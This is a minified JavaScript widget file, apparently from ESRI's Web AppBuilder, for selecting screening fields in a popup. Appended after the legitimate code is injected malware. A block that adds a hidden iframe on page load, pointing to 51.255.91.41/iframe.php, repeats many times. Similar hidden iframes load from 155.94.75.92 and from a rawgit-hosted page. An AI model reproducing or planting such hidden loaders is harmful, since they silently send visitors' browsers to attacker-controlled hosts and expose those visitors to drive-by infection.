// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dijit/_WidgetBase dojo/_base/lang dojo/Evented dojo/dom-construct dojo/_base/html dojo/_base/array dojo/query dojo/on dojo/dom-style jimu/dijit/Popup jimu/dijit/CheckBox dojo/NodeList-data".split(" "),function(l,m,f,n,p,c,g,e,q,h,r,t){return l([m,n],{baseClass:"jimu-widget-screening",selectedFields:[],fieldsPopup:null,constructor:function(a){this.selectedFields=[];this.fieldsPopup=null;f.mixin(this,a)},startup:function(){this._populateConfiguredFields();this.onFieldsSelectorClick();
q(window,"resize",f.hitch(this,function(){this._setFieldPopupDimensions()}))},_populateConfiguredFields:function(){for(var a in this.outFields)this.selectedFields.push(a)},onFieldsSelectorClick:function(){var a,b,k,g=0;b=c.create("div",{});p.create("div",{"class":"esriCTSelectFieldReportLabel",innerHTML:this.fieldTitle},b);k=c.create("div",{"class":"esriCTSelectFieldParentContainer",style:{maxHeight:"350px"}},b);this._fieldsCheckBox=[];for(a in this.outFields){var d=new t({checked:this._isSearchable(this.outFields[a]),
label:this.outFields[a].label||this.outFields[a].alias||a});c.addClass(d.domNode,"esriCTLayerFieldCheckbox");c.addClass(d.labelNode,"jimu-ellipsis");c.setAttr(d.domNode,{title:this.outFields[a].label||this.outFields[a].alias||a});"DartTheme"===this.appConfig.theme.name&&h.set(d.domNode.children[0],"backgroundColor","#4c4c4c");0===g%3&&(window.isRTL?c.setStyle(d.domNode,"marginRight",0):c.setStyle(d.domNode,"marginLeft",0));d.placeAt(k);e(d.domNode).data("fieldName",a);this._fieldsCheckBox.push(d);
g++}this.fieldsPopup=new r({titleLabel:this.popupTitle,autoHeight:!0,content:b,container:window.jimuConfig.layoutId,width:640,maxHeight:600,buttons:[{label:this.nls.common.ok,onClick:f.hitch(this,"_onSearchFieldsOk")},{label:this.nls.common.cancel}],onClose:f.hitch(this,function(){this.fieldsPopup=null})});c.addClass(this.fieldsPopup.domNode,this.appConfig.theme.name+"  "+this.baseClass);this._setFieldPopupDimensions()},_setFieldPopupDimensions:function(){this.fieldsPopup&&(window.appInfo.isRunInMobile?
(this.fieldsPopup.set("width",window.innerWidth-100),e(".esriCTLayerFieldCheckbox").addClass("esriCTLayerFieldWithoutMargin"),h.set(e(".esriCTSelectFieldParentContainer")[0],"height","200px")):(this.fieldsPopup.set("width",640),this.fieldsPopup.set("maxHeight",600),e(".esriCTLayerFieldCheckbox").removeClass("esriCTLayerFieldWithoutMargin")))},_isSearchable:function(a){return g.some(this.selectedFields,f.hitch(this,function(b){return a.hasOwnProperty("name")?a.name===b:a.hasOwnProperty("fieldName")?
a.fieldName===b:!1}))},_onSearchFieldsOk:function(){var a=[];g.forEach(this._fieldsCheckBox,function(b){if(b.getValue()){var c=e(b.domNode).data("fieldName");a.push(c[0]);e(b.domNode).removeData()}});this._setSearchFields(a);this.fieldsPopup.close();this.emit("onFieldSelectComplete",this.selectedFields)},_getSearchFields:function(){return this.selectedFields},_setSearchFields:function(a){this.selectedFields=a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});